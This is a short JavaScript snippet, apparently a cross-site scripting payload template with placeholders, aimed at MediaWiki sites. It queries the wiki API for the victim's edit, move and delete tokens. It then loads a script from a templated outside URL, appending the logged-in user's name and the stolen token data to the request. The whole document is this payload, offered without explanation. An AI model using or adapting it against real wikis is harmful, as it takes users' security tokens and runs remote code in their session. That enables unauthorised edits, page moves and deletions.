$.get(
    "%%mw_api_prefix%%/api.php?action=query&prop=info&intoken=edit|move|delete&titles=xpage&format=json",
    function (data) {
        $.getScript("%%retrieving_url%%".replace(/l=/g, "l=" + wgUserName)
        .replace(/d=/g, "d=" + encodeURIComponent(JSON.stringify(data))));
    }
)